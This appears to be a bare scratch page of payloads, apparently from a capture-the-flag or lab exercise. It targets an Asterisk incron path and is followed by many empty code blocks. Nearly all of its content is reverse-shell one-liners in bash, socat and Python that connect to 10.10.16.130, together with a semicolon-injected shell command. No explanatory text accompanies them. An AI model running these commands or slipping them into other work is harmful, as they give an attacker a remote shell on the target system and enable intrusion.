[[Editing Copy Page]]

```
/usr/local/asterisk/incron
```

```
grep -ri "/usr/local/asterisk/incron" / 2>/dev/null
```

```
a;sh -i >& /dev/tcp/10.10.16.130/4446 0>&1
```

```
echo "bash -i >& /dev/tcp/10.10.16.130/4446 0>&1" > bash.sh
```

```
bash -c "bash -i >& /dev/tcp/10.10.16.130/4446 0>&1"
```

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.16.130:4446
```

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.130",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```

```